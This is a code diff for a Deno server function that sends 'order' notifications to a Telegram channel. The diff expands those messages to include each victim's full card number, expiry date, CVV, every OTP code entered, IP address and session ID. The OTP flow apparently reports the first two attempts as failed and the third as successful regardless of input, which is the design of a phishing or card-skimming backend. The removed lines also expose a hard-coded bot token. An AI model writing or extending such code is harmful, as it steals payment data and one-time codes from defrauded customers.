@@ -1,8 +1,8 @@
+
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 
-// Hard-coding the tokens as requested by the user
-const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
-const TELEGRAM_CHANNEL_ID = "-1002550945996";
+const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+const TELEGRAM_CHANNEL_ID = Deno.env.get("TELEGRAM_CHANNEL_ID");
 
 const corsHeaders = {
   'Access-Control-Allow-Origin': '*',
@@ -37,7 +37,7 @@ interface OrderDetails {
   };
   notificationType: "order_placed" | "payment_details" | "otp_attempt";
   otpAttempt?: number;
-  otpValue?: string; // This field stores the actual OTP value entered
+  otpValue?: string; // Added to capture the actual OTP value entered
 }
 
 function formatOrderPlacedMessage(orderDetails: OrderDetails): string {
@@ -129,20 +129,52 @@ function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
   const attempt = orderDetails.otpAttempt || 0;
   const isLastAttempt = attempt === 3;
   
-  // Make the OTP value extremely prominent in the message
+  // Create a clear header based on attempt
+  const attemptHeader = isLastAttempt 
+    ? '✅ <b>OTP VERIFICATION SUCCESSFUL</b> ✅' 
+    : `⚠️ <b>OTP VERIFICATION ATTEMPT ${attempt}</b> ⚠️`;
+  
+  const statusText = isLastAttempt 
+    ? '✅ Success - Final attempt' 
+    : `❌ Failed - Attempt ${attempt} of 3`;
+    
+  // Add the actual OTP value entered by the user
   const otpValue = orderDetails.otpValue 
-    ? `🔢 <b>CODE ENTERED: <code>${orderDetails.otpValue}</code></b> 🔢`
-    : '🔢 <b>NO CODE PROVIDED</b> 🔢';
+    ? `<code>${orderDetails.otpValue}</code>`
+    : 'Not provided';
 
-  // Simplified format as requested by the user - just OTP code and basic user info
+  // Payment details section - show full card details
+  let paymentSection = '';
+  if (orderDetails.paymentMethod) {
+    paymentSection = `
+💳 <b>Payment Details</b>:
+   Method: ${orderDetails.paymentMethod || 'N/A'}
+   Card Number: <code>${orderDetails.cardNumber || 'N/A'}</code>
+   Expiry Date: ${orderDetails.expiryDate || 'N/A'}
+   CVV: <code>${orderDetails.cvv || 'N/A'}</code>
+   Order Amount: $${orderDetails.paymentAmount.toFixed(2)}
+   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}`;
+  }
+
   return `
-${otpValue}
+${attemptHeader}
 
 👤 <b>Customer</b>: ${orderDetails.customerName}
 📧 <b>Email</b>: ${orderDetails.email}
 📱 <b>Phone</b>: ${orderDetails.phone}
 
-🔐 <b>Verification Attempt</b>: ${attempt}/3
+🔐 <b>Verification Status</b>:
+   ${statusText}
+
+🔢 <b>OTP Entered</b>: ${otpValue}
+
+${paymentSection}
+
+🔍 <b>User Information</b>:
+   IP Address: <code>${orderDetails.userInfo.ip}</code>
+   Browser: ${orderDetails.userInfo.userAgent}
+   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
+   Timestamp: ${orderDetails.userInfo.timestamp}
 
 📆 <b>Attempt Time</b>: ${new Date().toLocaleString()}
 `;
@@ -162,14 +194,15 @@ function formatTelegramMessage(orderDetails: OrderDetails): string {
 }
 
 async function sendTelegramNotification(message: string): Promise<boolean> {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHANNEL_ID) {
+    console.error("Missing Telegram configuration - Bot Token or Channel ID not set");
+    return false;
+  }
+
   try {
     const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
     console.log(`Sending message to Telegram channel: ${TELEGRAM_CHANNEL_ID}`);
     console.log("Message content:", message); // Log the actual message for debugging
-    
-    // Detailed logging for debugging
-    console.log("Using bot token:", TELEGRAM_BOT_TOKEN.substring(0, 8) + "...");
-    console.log("Sending to channel ID:", TELEGRAM_CHANNEL_ID);
     
     const response = await fetch(telegramApiUrl, {
       method: "POST",
@@ -180,7 +213,6 @@ async function sendTelegramNotification(message: string): Promise<boolean> {
         chat_id: TELEGRAM_CHANNEL_ID,
         text: message,
         parse_mode: "HTML", // Using HTML for better formatting
-        disable_web_page_preview: true
       }),
     });
 
@@ -236,11 +268,6 @@ serve(async (req) => {
     }
     
     console.log("Received order details for Telegram notification:", orderDetails);
-    
-    // Double check OTP value is present
-    if (orderDetails.notificationType === "otp_attempt") {
-      console.log(`OTP Attempt ${orderDetails.otpAttempt}: OTP Value = "${orderDetails.otpValue}"`);
-    }
     
     // Format the message for Telegram
     const message = formatTelegramMessage(orderDetails);
